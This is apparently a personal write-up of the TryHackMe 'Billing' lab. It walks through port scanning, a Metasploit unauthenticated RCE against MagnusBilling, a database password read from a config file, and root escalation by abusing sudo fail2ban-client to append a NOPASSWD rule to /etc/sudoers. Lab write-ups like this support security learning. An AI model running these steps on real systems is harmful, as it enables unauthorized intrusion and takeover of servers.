---
title: "Billing"
date: 2024-03-08
draft: false
description: TryHackMe's Good Room
Tags:
- TryHackMe
- Linux
- Easy
---



## Enumeration

```
rustscan -a 10.10.179.166           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/k21/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.179.166:22
Open 10.10.179.166:80
Open 10.10.179.166:3306
Open 10.10.179.166:5038
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 03:23 +0545
Initiating Ping Scan at 03:23
Scanning 10.10.179.166 [4 ports]
Completed Ping Scan at 03:23, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:23
Completed Parallel DNS resolution of 1 host. at 03:23, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 03:23
Scanning 10.10.179.166 (10.10.179.166) [4 ports]
Discovered open port 80/tcp on 10.10.179.166
Discovered open port 22/tcp on 10.10.179.166
Discovered open port 5038/tcp on 10.10.179.166
Discovered open port 3306/tcp on 10.10.179.166
Completed SYN Stealth Scan at 03:23, 0.19s elapsed (4 total ports)
Nmap scan report for 10.10.179.166 (10.10.179.166)
Host is up, received reset ttl 60 (0.17s latency).
Scanned at 2025-03-08 03:23:25 +0545 for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 60
80/tcp   open  http    syn-ack ttl 60
3306/tcp open  mysql   syn-ack ttl 60
5038/tcp open  unknown syn-ack ttl 60

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (216B)
```

```
nmap -sVC 10.10.179.166           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 03:22 +0545
Nmap scan report for 10.10.179.166 (10.10.179.166)
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.179.166/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Lets see port 80.
![](Pasted%20image%2020250308033038.png)

Lets try to search for possible exploits and default creds.
![](Pasted%20image%2020250308032906.png)

And there is a unauthenticated RCE on it.
Lets try to search it on meterpreter.
![](Pasted%20image%2020250308033223.png)

## Exploit

Hmm so there is possible exploit.
Lets try this.
```
use 3
set LHOST tun0
set RHOSTS machine_ip
run
```

And we can see, it worked.
![](Pasted%20image%2020250308033410.png)

Note:this might also work.
[CVE-2023-30258](https://github.com/hadrian3689/)

## Privelege Escalation

Lets enumerate further.
And doing `sudo -l`, we can see this.
![](Pasted%20image%2020250308034458.png)

But lets first of all run linpeas.sh.
Hmm root is little bit trickier.

Reading config files showed this.
![](Pasted%20image%2020250308044851.png)

And that leads to this.
![](Pasted%20image%2020250308044925.png)

We have the db password.
```
dbhost = 127.0.0.1
dbname = mbilling
dbuser = mbillingUser
dbpass = BLOGYwvtJkI7uaX5

```

Lets try to login.
`mysql -u mbillingUser -p`
![](Pasted%20image%2020250308045153.png)

Lets enumerate this too.
We got the hash but it is also a rabbithole.
![](Pasted%20image%2020250308051547.png)

After  trying different things and talking with AI.
We could this.
`sudo /usr/bin/fail2ban-client status`
So the `fail2ban-client` is the tool for making a bruteforce attacks hard.
So we will use it here to escalate our privelege.

First we will create our own action.
`sudo /usr/bin/fail2ban-client set sshd addaction myaction`

So it add the new action named myaction to the sshd jail.

Now we need to define what our custom action does.
`sudo /usr/bin/fail2ban-client set sshd action myaction actionban "echo 'asterisk ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"`

So here, `echo 'asterisk ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` will triggered when sshd jail is triggered.
So we set the sshd action to our action and which will do a specific action to stop or reduce attack but here we used it to escalate our privelege to root.
![](Pasted%20image%2020250308055753.png)

And now we need to trigger that jail, So we can try to do failed ssh or use hydra for it.
![](Pasted%20image%2020250308060200.png)

And now if it is successful,we can see like this.
![](Pasted%20image%2020250308055859.png)

Now we can easily become root.
![](Pasted%20image%2020250308060038.png)

## Done

And done.
![](Pasted%20image%2020250308060453.png)

And learned lots of things again.

`MgnodcVwGxW0xLUN`

